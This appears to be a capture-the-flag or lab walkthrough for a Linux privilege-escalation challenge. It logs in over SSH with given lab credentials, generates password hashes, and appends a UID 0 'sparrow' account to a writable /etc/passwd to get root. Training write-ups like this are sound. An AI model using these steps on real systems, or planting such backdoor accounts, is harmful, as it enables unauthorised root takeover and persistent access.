# Name: Web: Privilege Escalation: Writable

## Vulnerability

Writable /etc/passwd.

## Exploit

Connect with ssh to user ```jack:YvFWPeC7sTWJdaYQ```, port 2022.

```ssh jack@<IP> -p 2022```

If you look at the ```/etc/passwd``` file we can see that our user account has read/write access.

```ls -la /etc/passwd```

What we can do is to generate a new password using openssl:

```openssl passwd -1 -salt sparrow sparrow```
```mkpasswd -m SHA-512 sparrow```
```python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'```

This will generate to you a new password which we will write to ```/etc/passwd``` file.

Add the following line:

```sparrow:GENERATED_PASSWORD:0:0:Sparrow:/root:/bin/bash```

Now you can switch the current user to the privileged ```sparrow``` user:

```su sparrow```

And you are root!
